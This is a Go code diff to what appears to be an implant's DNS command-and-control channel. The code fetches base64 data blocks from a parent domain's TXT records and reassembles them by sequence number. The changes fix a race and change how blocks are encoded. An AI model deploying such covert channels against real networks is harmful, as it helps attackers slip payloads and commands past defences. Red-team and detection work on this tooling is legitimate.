@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"log"
@@ -16,7 +17,7 @@ import (
 // RecvBlock - Single block from server
 type RecvBlock struct {
 	Index int
-	Data  string
+	Data  []byte
 }
 
 // BlockReassembler - Data is encoded and split into `Blocks`
@@ -30,7 +31,7 @@ const (
 	domainKeySubdomain = "_domainkey"
 	nonceStdSize       = 4
 
-	fetchTxts = 200 // How many txts to request at a time
+	maxFetchTxts = 200 // How many txts to request at a time
 )
 
 var (
@@ -61,7 +62,7 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 
 // DNSNonce - Generate a nonce of a given size
 func DNSNonce(size int) string {
-	insecureRand.Seed(time.Now().Unix())
+	insecureRand.Seed(time.Now().UnixNano())
 	nonce := []rune{}
 	for i := 0; i < size; i++ {
 		index := insecureRand.Intn(len(dnsCharSet))
@@ -82,44 +83,63 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 	}
 
 	var wg sync.WaitGroup
-	data := make([]string, reasm.Size)
+	data := make([][]byte, reasm.Size)
+
+	fetchTxts := maxFetchTxts
+	if reasm.Size < maxFetchTxts {
+		fetchTxts = reasm.Size
+	}
+
 	for index := 0; index < reasm.Size; index += fetchTxts {
 		wg.Add(1)
 		go fetchRecvBlock(parentDomain, reasm, index, index+fetchTxts, &wg)
 	}
+	done := make(chan bool)
 	go func() {
 		for block := range reasm.Recv {
 			data[block.Index] = block.Data
 		}
+		done <- true
 	}()
 	wg.Wait()
 	close(reasm.Recv)
+	<-done // Avoid race where range of reasm.Recv isn't complete
 
-	return base64.RawStdEncoding.DecodeString(strings.Join(data, ""))
+	msg := []byte{}
+	for _, buf := range data {
+		msg = append(msg, buf...)
+	}
+	return msg, nil
 }
 
 func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
 	defer wg.Done()
 	nonce := DNSNonce(nonceStdSize)
 	subdomain := fmt.Sprintf("_%s.%d.%d.%s._b.%s", nonce, start, stop, reasm.ID, parentDomain)
+	log.Printf("[dns] fetch -> %s", subdomain)
 	txts, err := net.LookupTXT(subdomain)
+	log.Printf("[dns] fetched %d txt record(s)", len(txts))
 	if err != nil {
 		log.Printf("Failed to fetch blocks %v", err)
 	}
 	for _, txt := range txts {
-		fields := strings.Split(txt, ".")
-		if len(fields) == 2 {
-			index, err := strconv.Atoi(fields[0])
-			if err != nil {
-				log.Printf("Invalid index in TXT record: %s", txt)
-				continue
-			}
-			reasm.Recv <- RecvBlock{
-				Index: index,
-				Data:  fields[1],
-			}
-		} else {
-			log.Printf("Invalid block TXT record: %s", txt)
+		log.Printf("Decoding TXT record: %s", txt)
+		rawBlock, err := base64.RawStdEncoding.DecodeString(txt)
+		if err != nil {
+			log.Printf("Failed to decode raw block '%s'", rawBlock)
+			continue
+		}
+		if len(rawBlock) < 4 {
+			log.Printf("Invalid raw block size %d", len(rawBlock))
+			continue
+		}
+		seqBuf := make([]byte, 4)
+		copy(seqBuf, rawBlock[:4])
+		seq := int(binary.LittleEndian.Uint32(seqBuf))
+		log.Printf("seq = %d (%d bytes)", seq, len(rawBlock[4:]))
+		reasm.Recv <- RecvBlock{
+			Index: seq,
+			Data:  rawBlock[4:],
 		}
 
 	}
